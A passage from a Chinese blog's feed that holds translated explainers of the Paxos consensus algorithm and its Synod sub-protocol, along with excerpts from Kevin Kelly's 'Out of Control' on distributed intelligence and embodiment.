&lt;h3 id=&quot;Synod算法：深入研究&quot;&gt;&lt;a href=&quot;#Synod算法：深入研究&quot; class=&quot;headerlink&quot; title=&quot;Synod算法：深入研究&quot;&gt;&lt;/a&gt;Synod算法：深入研究&lt;/h3&gt;&lt;p&gt;通过前面的章节对Synod算法选举过程中的三个阶段有个大致的了解：&lt;br&gt;初始化，投票和决议。现在我想详细说说这三个阶段，以及每个阶段的状态。每个节点有四个变量： &lt;code&gt;lastTried&lt;/code&gt;, &lt;code&gt;maxBallot&lt;/code&gt;, &lt;code&gt;prevVote&lt;/code&gt;和&lt;code&gt;prevBallot&lt;/code&gt;. 对于任意节点X，&lt;code&gt;lastTried&lt;/code&gt;指X最近一次要试着初始化的选举编号，&lt;code&gt;maxBallot&lt;/code&gt;指X参与过的最高优先级的选举编号,&lt;code&gt;preVote&lt;/code&gt;指X在&lt;code&gt;prevBallot&lt;/code&gt;选举过程中投票的值，而&lt;code&gt;preBallot&lt;/code&gt;指X上一次参与投票的选举编号。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[译者注：`lastTried`中的选举还没有开始，而`preBallot`已经参与投票了]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;lastTried&lt;/code&gt;和&lt;code&gt;maxBallot&lt;/code&gt;背后的考虑很简单–为了确保管理节点和参与节点讨论的是同一个选举。管理节点标记&lt;code&gt;lastTried&lt;/code&gt;的选举编号并验证它接收到的每一条信息，以确保它标记的的确就是这次选举。另一方面，每个参与的节点标记它参与过的最高优先级的选举编号&lt;code&gt;maxBallot&lt;/code&gt;，只有它们正在参与此次选举的时候才会给管理节点回复信息。正常执行过程中，一旦一个选举被初始化，所有节点的&lt;code&gt;maxBallot&lt;/code&gt;变量值都和管理者的&lt;code&gt;lastTried&lt;/code&gt;变量值相等。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[译者注：这里会有点绕，在看下文之前一定要先理解这几个变量的含义]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;为了简洁，下面的描述假设当管理者给每个节点发送信息的时候，也会给自己发送信息(当然也会回复自己)；这样对整个算法的描述和理解会变得更加简单。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;初始化&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;管理节点为选举选取编号n，&lt;code&gt;n&amp;gt;lastTried&lt;/code&gt;， 接着设置&lt;code&gt;lastTried=n&lt;/code&gt;,然后给每个节点发送&lt;code&gt;NextBallot(n)&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;在收到&lt;code&gt;NextBallot(n),n&amp;gt; maxBallot&lt;/code&gt;信息后，接收节点给管理节点发送&lt;code&gt;LastVote(n,prevVote,prevBallot）&lt;/code&gt;,接着设置&lt;code&gt;maxBallot=n&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;投票&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当管理节点从X节点收到信息 &lt;code&gt;LastVote(n,v,m), n==lastTried&lt;/code&gt;&lt;br&gt;时，X节点就被当做此次选举的参与者。如果节点的多数派都参与了此次选举，管理节点就可以继续进行投票过程，将&lt;code&gt;BeginBallot(n,Value）&lt;/code&gt;发送给所有参与此次选举的节点。&lt;br&gt;所有参与节点发送的&lt;code&gt;LastVote(n,v,m)&lt;/code&gt;选取最大m中的v值赋给&lt;code&gt;Value&lt;/code&gt;（简单地说，每个参与节点将它在最近一次选举过程中的投票发送给管理者，然后管理者从它们的投票中选取最近的一次投票结果)&lt;/li&gt;
&lt;li&gt;在接收到信息&lt;code&gt;BeginBallot(n,v),n==maxBallot&lt;/code&gt;后，接收的节点将&lt;code&gt;prevVote&lt;/code&gt;设置成&lt;code&gt;v&lt;/code&gt;，&lt;code&gt;preBallot&lt;/code&gt;设置成&lt;code&gt;n&lt;/code&gt;，然后回应信息&lt;code&gt;Voted(n)&lt;/code&gt;给管理节点。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;决议&lt;ul&gt;
&lt;li&gt;如果管理节点从每个参与节点中收到&lt;code&gt;Voted(n)&lt;/code&gt;， &lt;code&gt;n=lastTried&lt;/code&gt;信息后，管理节点就当作选举过程已经完成，Synod算法达成共识后的输出值就是投票过程中选出的&lt;code&gt;Value&lt;/code&gt;。控管理节点会把&lt;code&gt;Success(Value）&lt;/code&gt;信息发送给所有的节点。（注意，这时没必要把选举编号也发送出去，下文会解释原因)&lt;/li&gt;
&lt;li&gt;在收到任意一个节点发送的&lt;code&gt;Success(v&lt;/code&gt;）信息后，接收的节点都会认为这次选举结束了，并同意输出值&lt;code&gt;v&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;[译者注: 这里的`Value`被赋值`v`]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;对上面的算法作一些评论。首先，要注意在有些情况下，一个节点没必要回复信息(比如，当节点收到&lt;code&gt;NextBallot(n)&lt;/code&gt;信息的时候，那是它正在参与一次优先级更高的选举). 这时，管理节点在选举过程中可能会遇到”阻塞”，而不会继续执行。因为另外一个节点正在执行一次新的选举，新的选举就会替代阻塞的选举执行。为了让算法更加健壮，管理节点可以设置一个计时器，如果在设置的时间范围内没有收到足够的信息，管理节点就会放弃当前选举，而开始一个更新的选举。当两个不同的管理节点分别在对方的选举结束前开始一次新的选举，计时器机制可能会引起竞争条件。这种情况可以将Paxos算法中的决策者设定为一个来解决，这时Synod算法中也就只有一个管理者了。&lt;/p&gt;
&lt;p&gt;第二，选举编号在算法中起着至关重要的作用。如果不同的管理者都开始一个有相同编号的选举，算法就会崩溃。为了解决这个问题，每个管理者必须拥有唯一编号的数字集合，这种机制可以用下面的方法来保证：比如说，假定在Paxos算法中只有三个节点，给第一个节点分配1，4，7…第二个节点分配2，5，8…第三个节点分配3，6，9…&lt;/p&gt;
&lt;p&gt;最后，一旦&lt;code&gt;V&lt;/code&gt;的值被投票选出(有足够的节点在投票过程中为V投票)，如果此时另一个选举也结束了，算法总能保证此选举也以相同的V值结束(下文会描述这个性质). 因此，一旦&lt;code&gt;V&lt;/code&gt;的值被选出，就可以发送给所有的节点。我们就没必要考虑这个值来自哪次选举。这就是为什么&lt;code&gt;SUCCESS&lt;/code&gt;信息不必含有选举编号&lt;/p&gt;
&lt;h3 id=&quot;为什么这样有效？&quot;&gt;&lt;a href=&quot;#为什么这样有效？&quot; class=&quot;headerlink&quot; title=&quot;为什么这样有效？&quot;&gt;&lt;/a&gt;为什么这样有效？&lt;/h3&gt;&lt;p&gt;在Synod算法中最需要论证的点在于它不会产生两个不同的输出。只有当一个值在投票阶段有足够的节点给它投票时这个值才会被输出。因此，我们需要阐述在投票阶段有足够的节点给V投票时，任何其它的选举当进行到决议阶段的时候都会选举V作为输出。&lt;/p&gt;
&lt;p&gt;考虑Synod算法的一次执行，对于选举编号&lt;code&gt;n&lt;/code&gt;，V值在投票过程中被投票，之后选举进行到决议阶段。要进行到决议阶就要求所有参与节点已经投票，并且要进行到投票阶段需要节点的多数派都会在初始化阶段给出回应。这样，我们可以得到一个结论，节点的多数派都把票投给了值V。 也就是说，在投票阶段，它们都将&lt;code&gt;prevVote&lt;/code&gt;的值设置成&lt;code&gt;V&lt;/code&gt;，&lt;code&gt;prevBallot&lt;/code&gt;设置成&lt;code&gt;n&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;现在，再考虑下面的选举过程(m是大于n的最小的那个编号），选举通过了初始化阶段，开始进行投票阶段。它必须收到节点的多数派对&lt;code&gt;LastVote&lt;/code&gt;信息的响应。如果我们有两个集合，每个集合含有超过一半的节点，那就肯定有一个节点同时都在这两个集合内。因此，会有一个节点在选举n中把票投给了&lt;code&gt;V&lt;/code&gt;值，并在选举&lt;code&gt;m&lt;/code&gt;中发送了信息&lt;code&gt;LastVote(m,V,n)&lt;/code&gt;。由于&lt;code&gt;V&lt;/code&gt;的值来源于最高优先级的选举结果(回忆一下，n是具有最高优先级的选举，而不是&lt;code&gt;m&lt;/code&gt;）， 这个值是选举&lt;code&gt;m&lt;/code&gt;中的管理者选出来的，因此，如果有任何节点更新了&lt;code&gt;prevVote&lt;/code&gt;的值，都会把这个值赋给&lt;code&gt;V&lt;/code&gt;。如果接下来的的选举都结束了，结束的时候都会选举出与选举&lt;code&gt;n&lt;/code&gt;中相同的值，比如说，结束的时候输出值为&lt;code&gt;V&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[译者注：n是在上一次选举的最高优先级编号,虽然m&amp;gt;n，这时m已经是下一次选举了]
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;长话短说&quot;&gt;&lt;a href=&quot;#长话短说&quot; class=&quot;headerlink&quot; title=&quot;长话短说&quot;&gt;&lt;/a&gt;长话短说&lt;/h3&gt;&lt;p&gt;好吧，说了一大堆。我们来回忆一下。Paxos算法为分布式日志的每条索引都运行一个Synod实例。比如，对第一条索引运行一次Synod实例，对第二条索引又运行另一个实例，以此类推。Synod算法通过选举决议最终都会在同一个值上达成共识。每次选举有一个管理节点，管理节点试着让节点的多数派都能同意参与到选举过程中，然后收集参与节点的提案值，选出其中一个值让节点投票。如果管理节点收到足够的投票，这个值就会被选出作为Synod算法的输出值。&lt;/p&gt;
&lt;p&gt;Synod的算法关键在于要确保多个选举过程能并发执行的同时，输出的值还能保证一致性。比如，如果选举X和选举Y同时进行，选举X结束的时候输出V值，那么在选举Y结束的时候，也必须输出V值。&lt;/p&gt;
&lt;p&gt;由于多个选举可能并发执行的原因，可能会带来相互干扰的问题，进而引发竞争条件导致选举的无限循环。然而，如果Paxos算法只有一个决策者，那在Synod的每个实例中，只有一个节点管理选举过程时，就能确保每次执行一次选举，进而能避免竞争条件和无限循环。&lt;/p&gt;
&lt;h3 id=&quot;Related-papers&quot;&gt;&lt;a href=&quot;#Related-papers&quot; class=&quot;headerlink&quot; title=&quot;Related papers&quot;&gt;&lt;/a&gt;Related papers&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://research.microsoft.com/en-us/um/people/lamport/pubs/lamport-paxos.pdf?tduid=(dd7507dc5da69f82517b43f2b4f6d1a2&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;The Part-Time Parliament, Lamport&lt;/a&gt;(256380)(2459594)(TnL5HPStwNw-cQHoEYux98mXntql_ljIyw)())&lt;/p&gt;
&lt;h3 id=&quot;Acknowledgement&quot;&gt;&lt;a href=&quot;#Acknowledgement&quot; class=&quot;headerlink&quot; title=&quot;Acknowledgement&quot;&gt;&lt;/a&gt;Acknowledgement&lt;/h3&gt;&lt;p&gt;注：[特别重要]&lt;/p&gt;
&lt;p&gt;[Lamport论文中对Paxos算法的描述是出了名的晦涩难懂，也由于Paxos算法本身的复杂性，以至于让Lamport每次都得解释好几遍。故挑选几篇对Paxos算法描述比较浅显易懂的博客翻译，希望能对大家理解Paxos算法有那么一点点帮助&lt;/p&gt;
&lt;p&gt;译者水平有限，对Paxos算法的理解离Lamport大师本人要表达的精髓还相差甚远，如有不对的地方，请一定要指出]&lt;/p&gt;
&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;译文，仅为学习使用，未经博主同意，请勿转载。&lt;/p&gt;
&lt;p&gt;原文地址：&lt;a href=&quot;https://distributedthoughts.wordpress.com/2013/09/30/understanding-paxos-part-2/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://distributedthoughts.wordpress.com/2013/09/30/understanding-paxos-part-2/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文地址： &lt;a href=&quot;http://www.chongh.wiki/blog/2016/04/28/understand-paxos2/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/04/28/understand-paxos2/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;译者 [ 新浪微博: &lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;] ，感谢好友&lt;a href=&quot;http://weibo.com/u/2765244861?topnav=1&amp;amp;wvr=6&amp;amp;topsug=1&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@睡眼惺忪的小叶先生&lt;/a&gt;与我几次激烈的讨论，对本文很有帮助&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://www.chongh.wiki/blog/2016/04/28/understand-paxos1/&quot;&gt;上一篇&lt;/a&gt;博客对Paxos算法做了大致的介绍。快速回顾一下： Paxos算法实现了一种可恢复的分布式日志，日志可以添加条目并为每个条目分配一个独有(递增)的索引。算法由三部分组成：决策者选举算法，条目共识算法(称为Synod算法)和管理日志协议。在这篇博客中，我会详细讨论Synod算法。&lt;/p&gt;
    
    </summary>
    
      <category term="Algorithm" scheme="http://yoursite.com/categories/Algorithm/"/>
    
    
      <category term="Distributed" scheme="http://yoursite.com/tags/Distributed/"/>
    
      <category term="Algorithm" scheme="http://yoursite.com/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>有心智的机器</title>
    <link href="http://yoursite.com/blog/2016/04/29/shikongnote2/"/>
    <id>http://yoursite.com/blog/2016/04/29/shikongnote2/</id>
    <published>2016-04-29T15:50:55.000Z</published>
    <updated>2016-05-13T20:29:21.000Z</updated>
    
    <content type="html">&lt;p&gt;当某个系统能够正常运转时，不要扰乱它；要以它为基层来构建。在自然体系中，改良就是在现存的调试好的系统上打补丁。原先的层级继续工作，甚至不会注意到(或不必注意到)其上还有新的层级。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;动物在进化过程中的学习方式与此类似。布鲁克斯的移动机器人亦是如此。他们通过建立行为层级来徐汇穿越复杂的世界，其顺序大致如下：避免碰触物体，无目的漫游，探索世界，构造内在地图，注意环境变化，规划类型方案，遇见变化并相应修改方案。&lt;/p&gt;
&lt;p&gt;众愚成智&lt;/p&gt;
&lt;p&gt;人类有大脑，但它既非中央集权，也没有所谓的中心。大脑有一个中心的想法是错误的，而且错得还很离谱。意识的各种功能，比如死开，都来自不司职思考的部分。&lt;br&gt;人体内没有一处是用来控制行为的，也没有溢出会创造行走，没有所谓的灵魂居所。如果你仔细看看大脑内部，会发现里面其实空无一物。&lt;/p&gt;
&lt;p&gt;有许多微不足道的小东西，本身没有什么意义，但意义正是通过其分布式交互而涌现出来的。一大堆分散的模块生成常常自相矛盾的原材料。&lt;/p&gt;
&lt;p&gt;每个机构都只有低能儿的水平，但通过错综复杂的层累控制，以许多不同的搭建组合有机结合起来，就能创造高难度的思维活动。没有心智社会就没有智能。智慧从愚笨中来。&lt;/p&gt;
&lt;p&gt;人无我，蜂窝无我，野兽无我，公司无我，家国无我，任何活物都没有我。一个活系统的我是一个幽灵，是不知晦朔的朝菌。它就如同亿万个水分子汇成的瞬间的漩涡，指尖轻轻一碰，便即销饵无形。&lt;/p&gt;
&lt;p&gt;利用现实世界的反馈实现交流&lt;/p&gt;
&lt;p&gt;过度集中的通讯负荷并非中央大脑仅有的麻烦。中央内存的维护同样让人感到头痛。共享的内存必须严格、实时、准确地更新---很多公司对此都深有感触。对机器人来说，控制中心要承担的艰巨任务是根据自己的感知来编辑或更新一个外部世界模型，一个理论，或者一个表述---墙在哪里，没还有多远，还有、别忘了，留神那里的楼梯。&lt;/p&gt;
&lt;p&gt;时至今日，自然科学一直未能解决一个难题，就是如何建立一种纯意识。&lt;/p&gt;
&lt;p&gt;无躯体则无意识&lt;/p&gt;
&lt;p&gt;功能强大的计算机催生了无躯体只能的狂热幻想。我们都见过这样一种表述：意识可以栖居于浸泡在容器中的大脑里。现代人说，借助科学，我可以无需躯体而以大脑的形式继续存活下去。由于计算机本身就是巨大的头脑，所以我可以生存在计算机中。同样道理，计算机意识也可以轻易地使用我的躯体。&lt;/p&gt;
&lt;p&gt;在美国通俗文化的圣典中，意识的可转移性已经成为被广泛信守的教条。人们宣称，意识转移是绝妙的想法、惊人的想法，却没有人认为那是错误的想法，现代民众相信，意识可以在容器间倒来倒去，由此产生《终结者2》、《弗兰肯斯坦》等一大批类似的科幻作品。&lt;/p&gt;
&lt;p&gt;不管结果如何，在现实中，我们不以头脑为中心，也不以意识为中心，即便真的如此，我们的意识也没有中心，没有我。我们的身体也没有向心性。身体和意识跨越了彼此间的假象边界，模糊了彼此间的差别。它们都是由大量的亚层次物质组成的。&lt;/p&gt;
&lt;p&gt;身体是意识乃至生命停泊的港湾，是阻止意识被自酿的风暴吞噬的机器。神经线路天生就有玩火自焚的倾向。如果放任不管，不让它直接连接外部世界，聪明的网络就会把自己的构想当做现实。意识不可能超出其所能度量或计算的范畴。没有身体，意识便只能估计自己，出于天赐的好奇心，即便是最简单的头脑也会面对挑战时，殚精竭虑以求一解。然而，如果意识直面的都是自身内部的线路和逻辑问题，那它就只能终日沉迷于自己所创造出的奇思异想。&lt;/p&gt;
&lt;p&gt;自然进化强调我们是猿类；而人工进化则强调我们是有心智的机器。&lt;/p&gt;
&lt;p&gt;机器现在还是不讨人喜欢的东西，因为我们没有为其注入生命的精髓。但是我们将被迫重新打造它们，使之在某天成为众口称道的东西。&lt;/p&gt;
&lt;p&gt;-摘录自《失控》&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;当某个系统能够正常运转时，不要扰乱它；要以它为基层来构建。在自然体系中，改良就是在现存的调试好的系统上打补丁。原先的层级继续工作，甚至不会注意到(或不必注意到)其上还有新的层级。&lt;/p&gt;
    
    </summary>
    
      <category term="Misc" scheme="http://yoursite.com/categories/Misc/"/>
    
    
  </entry>
  
  <entry>
    <title>深入理解Paxos算法(一)</title>
    <link href="http://yoursite.com/blog/2016/04/28/understand-paxos1/"/>
    <id>http://yoursite.com/blog/2016/04/28/understand-paxos1/</id>
    <published>2016-04-28T05:31:00.000Z</published>
    <updated>2016-04-30T16:13:49.000Z</updated>
    
    <content type="html">&lt;p&gt;我第一次听说Paxos算法是在2004年，&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;那时我还在读本科，修了一门分布式算法的课程。在过去的几年里，Paxos算法被提出过许多次，主要应用在可扩展存储系统中的健壮性实施上。我对此总是充满敬畏之心，“简直难以置信的复杂，Paxos算法，当心!”. 我决定再读一遍原论文，试着去解释Paxos算法做了些什么以及又是如何做到的。简单地说，Paxos解决了这样一个问题：可恢复的复制不断增长的条目。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[译者注：这里的条目一般指日志中`ITEM`]
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;背景知识&quot;&gt;&lt;a href=&quot;#背景知识&quot; class=&quot;headerlink&quot; title=&quot;背景知识&quot;&gt;&lt;/a&gt;背景知识&lt;/h3&gt;&lt;p&gt;Paxos算法原论文中介绍了Paxos（帕克西）岛屿中的立法议会问题。帕克西岛议会在一个音响效果非常差劲的大厅举办，所以立法者们都通过信差传递信息。由于立法者和信差都是商人的缘故，他们随时都有可能离开议会房间。每位立法者能提议一个法案，如果法案通过，就会被记录在每位立法者的笔记本上。每个通过的法案都有一个索引，e.g.，”137:每吨橄榄收取5%的税”，也就是说#137法案的内容是：“每吨橄榄收取5%的税”。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[译者注：商人都忙着挣钱呢,而立法者和信差离开会导致信息丢失或信息重复传递等问题]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在帕克西岛屿议会的故事中隐藏着一个分布式日志(有时称作日报)能将节点失效以及信息丢失(立法者和信差离开房间)恢复的理论。 Paxos算法处理请求并将信息添加到日志中(法案通过).每个添加到日志中的法案都由一个有序增长的索引来标识(e.g.，条目A的索引是1，条目B的索引是2)。所有参与Paxos算法的节点最终都会知道每个条目都伴随一个索引被添加到每个立法者手上的笔记本中。&lt;/p&gt;
&lt;p&gt;考虑一个可能的API形式化问题来理解Paxos算法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;添加条目—将条目添加到日志中，然后返回每个条目的索引，如果条目没有添加，则返回-1&lt;/li&gt;
&lt;li&gt;获取索引—返回指定索引的条目，如果条目没有添加，则返回空值(&lt;code&gt;NULL&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;每个条目在添加时都会触发一个事件，此事件将条目以及条目的索引作为参数&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;注意，获取索引的操作是最终一致性的(&lt;a href=&quot;https://distributedthoughts.wordpress.com/2013/09/08/eventual-consistency/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;eventually consistent&lt;/a&gt;). 如果能加入其它的一些逻辑，这种一致性能做到强一致性。Paxos算法最终一致性的实现在 &lt;a href=&quot;https://cloud.google.com/appengine/docs/java/gettingstarted/using-datastore-objectify&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Google’s HRD&lt;/a&gt; 可以找到。&lt;/p&gt;
&lt;h3 id=&quot;为什么选择Paxos算法？&quot;&gt;&lt;a href=&quot;#为什么选择Paxos算法？&quot; class=&quot;headerlink&quot; title=&quot;为什么选择Paxos算法？&quot;&gt;&lt;/a&gt;为什么选择Paxos算法？&lt;/h3&gt;&lt;p&gt;如果你想以容错的方式存储数据。根据&lt;a href=&quot;https://en.wikipedia.org/wiki/Split-brain_(computing&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;split brain&lt;/a&gt;原理，你会发现两个节点是不够的。因此，你要有三个节点： X, Y 和 Z。当你在读/写操作时，如果其中一个节点宕机了，要保证操作能正常地继续执行。我们你正在写数据的时候， X 宕机了， Y 和 Z 都在处理这个请求。但与此同时，当Y和Z正要提交数据的时候，维护人员把 X 修复好了，然而又 不小心把 Y 弄宕机了。这时，被写入的值是什么状态? 还在那吗？ 我们能确保 X 和 Z 能同步并获取正确的值吗？ 在这种情况下，可能性非常小。 更何况当你的系统大到有许多节点许多信息要传递的时候，可能性都是非常小的。&lt;/p&gt;
&lt;p&gt;这就是Paxos算法出现的缘由。Paxos算法&lt;br&gt;确保在数据被写入过程中，不管发生什么，最终都会将数据发送给所有的节点。&lt;br&gt;并且，不同的节点不会觉得某些索引中含有不同的值(e.g.，日志记录冲突)。这种保证称之为Paxos算法的”安全性”(safety)。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[译者注：这里的值指被添加的条目]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Paxos算法假设：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;消息被发送后内容不会修改&lt;/li&gt;
&lt;li&gt;节点能按照指定的算法运行(e.g.，没有bug,没有黑客)&lt;/li&gt;
&lt;li&gt;节点有永久性存储器（e.g.，当节点崩溃时，存储器的内容不会丢失)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;尽管以下情况可能会发生，Paxos还是能保证“安全性”：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;信息丢失或者被复制&lt;/li&gt;
&lt;li&gt;一些(甚至所有)节点宕机或者重启&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;然而，当系统真的处于“疯狂”状态时（所有的节点都宕机了), Paxos算法并不能保证读/写操作能正常进行。如果有足够的(多数)节点能恢复并能正常通信，Paxos算法就能确保读/写操作都能正确执行，这种性质称为”存活性”(liveness).&lt;/p&gt;
&lt;p&gt;总结这一章节，在多数节点都能正常相互通信时，Paxos算法总能在保证“安全性”的同时，又能保证“存活性”. （这也就是Paxos需要三个节点来支撑一次失效，五个节点来支撑两次失效的缘故).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[译者注：具体可以参考split brain原理，至少需要多少个节点才能支撑失效]
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;Paxos算法-一个菜鸟的视角&quot;&gt;&lt;a href=&quot;#Paxos算法-一个菜鸟的视角&quot; class=&quot;headerlink&quot; title=&quot;Paxos算法: 一个菜鸟的视角&quot;&gt;&lt;/a&gt;Paxos算法: 一个菜鸟的视角&lt;/h3&gt;&lt;p&gt;Paxos算法有三个主要模块: a) 决策者选举协议–决定哪个节点具有决策权， b) 单个日志条目共识协议(称为Synod算法)来保证”安全性“ 以及 c) 管理日志协议，e.g. 哪个条目应该被添加&lt;/p&gt;
&lt;p&gt;一个菜鸟对这个算法的理解是这样的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每 X 秒运行一次决策者选举算法，以便让所有节点知道哪个节点拥有决策权&lt;/li&gt;
&lt;li&gt;当决策者收到一个添加日志条目 &lt;code&gt;ITEM&lt;/code&gt; 的请求时，会选取下一个闲置的索引&lt;code&gt;INDEX&lt;/code&gt;，然后达成一个共识：将&lt;code&gt;（INDEX,ITEM)&lt;/code&gt;添加到日志中&lt;/li&gt;
&lt;li&gt;在达成这样一个共识的过程中：将&lt;code&gt;（INDEX,ITEM)&lt;/code&gt;添加到日志中。所有的节点都会参与投票，最终同意条目 &lt;code&gt;ITEM&lt;/code&gt; 被添加到日志中并赋予索引 &lt;code&gt;INDEX&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;[译者注:这里说的投票过程在Synod算法中实现]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;决策者选举算法意味着选取的具有决策权的节点是每个节点都认可同意的。目前有许多决策者选举算法，Paxos算法并没有具体化该使用哪一个。一个简单的方法就是将每个节点都赋予一个ID，然后将它们的ID广播给每个节点，拥有最高值ID的节点就是决策者。&lt;/p&gt;
&lt;p&gt;存在这种可能性(e.g.,在网络分离时)会选出不止一个决策者。举个例子，在上述的决策者选举算法中，如果拥有最高ID值的节点的信息丢失了，最高和第二高ID的节点就有可能都被选举为决策者。在有不止一个决策者的情况下，Synod算法(共识算法)也能确保为每个日志记录最多选出一个条目。我会在下一篇博客中详细讲述Synod算法。现在就已经能足够说明，当两个不同决策者在&lt;code&gt;(INDEX,ITEM1)&lt;/code&gt;和&lt;code&gt;(INDEX,ITEM2)&lt;/code&gt;上要达成共识时---同一个索引中含有两个不同的条目---其中只有一个能被选出。&lt;/p&gt;
&lt;p&gt;我们先离开一会，来聊一聊管理日志的问题：假定只有一个决策者，当决策者被选出时，它会检查整个日志然后看看里面是否有“空隙”（hole). e.g.，日志记录中的值还没有达成共识。举个例子，索引“17”中有个空隙. 这时，决策者会运行Synod算法，初始化(17,EMPTY). 根据Synod算法，它要么是在&lt;code&gt;(17,EMPTY)&lt;/code&gt;,要么是在&lt;code&gt;(17,VALUE)&lt;/code&gt;（VALUE是之前提案的值)上达成共识。无论如何，两种情况下，空隙都填满了。&lt;/p&gt;
&lt;p&gt;当不再有空隙时，决策者就可以开始处理写操作了：对于每个添加条目到日志中的请求，决策者会运行共识算法，初始化&lt;code&gt;(INDEX,ITEM)&lt;/code&gt;,&lt;code&gt;INDEX&lt;/code&gt;是下一个可用的索引，&lt;code&gt;ITEM&lt;/code&gt; 是要被写进日志的条目。注意，决策者能同时添加多个条目到日志中，也包括添加条目来填补空隙的情况。&lt;br&gt;只要存在唯一的决策者，条目都会被添加到日志中。如果有多个决策者，这个算法可能会停止，直到下一次只出现一个决策者的时候。&lt;/p&gt;
&lt;h3 id=&quot;长话短说&quot;&gt;&lt;a href=&quot;#长话短说&quot; class=&quot;headerlink&quot; title=&quot;长话短说&quot;&gt;&lt;/a&gt;长话短说&lt;/h3&gt;&lt;p&gt;总结一下，Paxos算法是一种能将分布式日志抽象化的高度可恢复性算法。算法假设某些机制能选举出一个决策者。尽管存在没有决策者或者有多个决策者的情况，Paxos算法都能确保分布式日志中的数据一致性。通常情况下确实只有一个决策者，这时数据都能被及时的插入到日志中并能保持一致性。&lt;/p&gt;
&lt;p&gt;Paxos算法的可恢复性能容忍节点失效，重启，信息丢失以及网络分离。当超过一半的节点能正常通信时，Paxos算法就能正常的执行写操作。当少于一半的节点能正常通信时(可能因为宕机，也可能因为网络分离),Paxos也能保证一致性，但数据不一定能写入（e.g. 没有写成功)。&lt;/p&gt;
&lt;p&gt;总之，如果相比 AP, 你更喜欢 CP 的话 (&lt;a href=&quot;https://en.wikipedia.org/wiki/CAP_theorem&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CAP定理&lt;/a&gt; ），Paxos算法对你来说是一个非常好的解决方案。&lt;/p&gt;
&lt;h3 id=&quot;Related-papers&quot;&gt;&lt;a href=&quot;#Related-papers&quot; class=&quot;headerlink&quot; title=&quot;Related papers&quot;&gt;&lt;/a&gt;Related papers&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://research.microsoft.com/en-us/um/people/lamport/pubs/lamport-paxos.pdf?tduid=\(dd7507dc5da69f82517b43f2b4f6d1a2\&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;The Part-Time Parliament, Lamport&lt;/a&gt;(256380)(2459594)(TnL5HPStwNw-LkhlnevB9dnJgzTQ4MgOnQ)())&lt;br&gt;&lt;a href=&quot;http://www.cs.utexas.edu/users/lorenzo/corsi/cs380d/past/03F/notes/paxos-simple.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Paxos Made Simple, Lamport&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Acknowledgement&quot;&gt;&lt;a href=&quot;#Acknowledgement&quot; class=&quot;headerlink&quot; title=&quot;Acknowledgement&quot;&gt;&lt;/a&gt;Acknowledgement&lt;/h3&gt;&lt;p&gt;注:[特别重要]&lt;/p&gt;
